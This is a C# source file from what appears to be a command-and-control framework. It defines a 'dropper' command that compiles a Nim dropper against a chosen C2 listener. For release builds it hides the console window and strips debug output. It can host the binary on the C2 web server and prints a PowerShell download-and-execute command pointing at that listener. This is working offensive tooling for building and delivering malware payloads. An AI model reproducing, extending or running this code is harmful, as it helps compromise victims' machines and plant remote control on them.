using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Internal;
using System.IO;

namespace Commander.Commands.Laucher
{
    public class BuildStagerCommandCommandOptions
    {

        public string listenerName { get; set; }

        public string fileName { get; set; }

        public bool debug { get; set; }

        public bool webhost { get; set; }

        public bool verbose { get; set; }
    }
    public class BuildDropperCommand : EnhancedCommand<BuildStagerCommandCommandOptions>
    {
        public static string ScriptFolder { get; set; } = "/Share/tmp/C2/Commander/Script";

        public override string Category => CommandCategory.Commander;
        public override string Description => "Create a dropper file";
        public override string Name => "dropper";

        public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("listenerName", "name of the listener used"),
            new Option<string>(new[] { "--fileName", "-f" }, () => "dropper.exe" ,"Nome of the file to be crafted"),
            new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
            new Option(new[] { "--webhost", "-wh" }, "Host the payload on the C2 Web Host"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildStagerCommandCommandOptions> context)
        {
            var listeners = context.CommModule.GetListeners();
            var listener = listeners.FirstOrDefault(l => l.Name.ToLower() == context.Options.listenerName.ToLower());

            if (listener == null)
            {
                context.Terminal.WriteLine($"No Listener named {context.Options.listenerName}");
                return false;
            }

            //nim c --app:console -f -d:mingw -o:Downloader Dowloader.nim

            string nimExecutable = "/usr/bin/nim";

            if (!File.Exists(nimExecutable))
            {
                context.Terminal.WriteError($"Cannot find {nimExecutable}");
                return false;
            }

            string path = ScriptFolder;

            var dotnetparms = (listener.Secured ? "https" : "http") + ":" + listener.Ip + ":" + listener.PublicPort;

            string outPath = Path.Combine("/tmp", context.Options.fileName);
            var parms = new List<string>();
            parms.Add("c");
            if (context.Options.debug)
            {
                path =  Path.Combine(path, "dropper.nim");
                parms.Add("--app:console");
            }
            else
            {
                //remove echo lines from source
                path =  Path.Combine(path, "dropper_release.nim");
                parms.Add("--app:gui");
                parms.Add("-d:release");
                parms.Add("-d:strip");
                parms.Add("--passL:-s");
            }
            parms.Add("-f");
            parms.Add("-d:mingw");
            parms.Add($"-o:{outPath}");
            parms.Add($"-d:ServerPort=80");
            parms.Add($"-d:ServerAddress={listener.Ip}");
            parms.Add($"-d:DotNetParams={dotnetparms}");

            parms.Add($"{path}");

            context.Terminal.WriteLine($"[>] Generating dropper...");

            if (context.Options.verbose)
                context.Terminal.WriteLine($"[>] Executing: {nimExecutable} {string.Join(" ", parms)}");
            var executionResult = BuildHelper.ExecuteCommand(nimExecutable, parms, ScriptFolder);

            if (context.Options.verbose)
                context.Terminal.WriteLine(executionResult.Out);
            if (executionResult.Result != 0)
            {
                context.Terminal.WriteError($"[X] Build Failed!");
                return false;
            }

            context.Terminal.WriteSuccess($"[*] Build succeed.");
            context.Terminal.WriteInfo($"Dropper can be found at {outPath}");
            if (context.Options.webhost)
            {
                byte[] fileContent = File.ReadAllBytes(outPath);
                context.CommModule.WebHost(listener.Id, context.Options.fileName, fileContent);

                string url = $"http://{listener.Ip}/{context.Options.fileName}";
                context.Terminal.WriteLine($"[X] dropper hosted on : {url}");

                context.Terminal.WriteLine($"[>] Command : powershell -c \"iwr -Uri '{url}' -OutFile '{context.Options.fileName}'; .\\{context.Options.fileName}\"");
            }



            return true;
        }
    }

}
